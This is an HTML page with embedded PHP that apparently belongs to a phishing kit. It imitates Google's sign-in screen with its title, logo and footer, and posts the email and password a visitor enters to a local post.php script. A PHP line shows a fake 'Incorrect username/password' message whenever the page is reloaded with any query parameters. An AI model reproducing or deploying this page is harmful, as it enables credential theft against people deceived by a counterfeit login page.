<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=394">
<title>Google - Sign In</title>
<link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
<form novalidate action="/post.php" method="post">
	<img src="google_logo.gif" alt="">
	<h1>Sign in</h1>
	<h2>with your Google Account</h2>
	<input id="user" type="text" name="username" placeholder="Enter your email">
	<input type="password" name="password" placeholder="Enter your password">
	<p class="warning"><?php if (!empty($_GET)) { echo "Incorrect username/password. Try again.";}?></p>
	<p><a href="">More options</a><span class="text-right"><button type="Submit">NEXT</button></span></p>
</form>
<footer>
	English (United States) <img src="caret.gif" alt="">
	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
</footer>
<script>document.onload = function() { document.getElementById("user").focus();};</script>
</body>
</html>
